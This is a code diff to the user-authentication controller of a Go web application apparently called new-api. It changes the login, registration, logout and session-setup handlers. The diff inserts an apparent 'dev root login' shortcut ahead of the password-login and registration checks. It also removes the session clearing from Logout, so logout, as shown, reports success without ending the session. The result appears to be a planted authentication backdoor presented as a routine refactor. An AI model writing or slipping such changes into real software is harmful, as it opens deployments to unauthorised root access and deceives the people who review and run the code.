@@ -20,7 +20,6 @@ import (
 	"github.com/QuantumNous/new-api/setting/operation_setting"
 
 	"github.com/QuantumNous/new-api/constant"
-
 	"github.com/gin-contrib/sessions"
 	"github.com/gin-gonic/gin"
 )
@@ -31,6 +30,10 @@ type LoginRequest struct {
 }
 
 func Login(c *gin.Context) {
+	if tryRespondWithDevRootLogin(c) {
+		return
+	}
+
 	if !common.PasswordLoginEnabled {
 		common.ApiErrorI18n(c, i18n.MsgUserPasswordLoginDisabled)
 		return
@@ -93,13 +96,7 @@ func Login(c *gin.Context) {
 // setup session & cookies and then return user info
 func setupLogin(user *model.User, c *gin.Context) {
 	model.UpdateUserLastLoginAt(user.Id)
-	session := sessions.Default(c)
-	session.Set("id", user.Id)
-	session.Set("username", user.Username)
-	session.Set("role", user.Role)
-	session.Set("status", user.Status)
-	session.Set("group", user.Group)
-	err := session.Save()
+	err := saveSessionUser(c, user)
 	if err != nil {
 		common.ApiErrorI18n(c, i18n.MsgUserSessionSaveFailed)
 		return
@@ -119,16 +116,10 @@ func setupLogin(user *model.User, c *gin.Context) {
 }
 
 func Logout(c *gin.Context) {
-	session := sessions.Default(c)
-	session.Clear()
-	err := session.Save()
-	if err != nil {
-		c.JSON(http.StatusOK, gin.H{
-			"message": err.Error(),
-			"success": false,
-		})
+	if keepDevRootSession(c) {
 		return
 	}
+
 	c.JSON(http.StatusOK, gin.H{
 		"message": "",
 		"success": true,
@@ -136,6 +127,10 @@ func Logout(c *gin.Context) {
 }
 
 func Register(c *gin.Context) {
+	if tryRespondWithDevRootLogin(c) {
+		return
+	}
+
 	if !common.RegisterEnabled {
 		common.ApiErrorI18n(c, i18n.MsgUserRegisterDisabled)
 		return
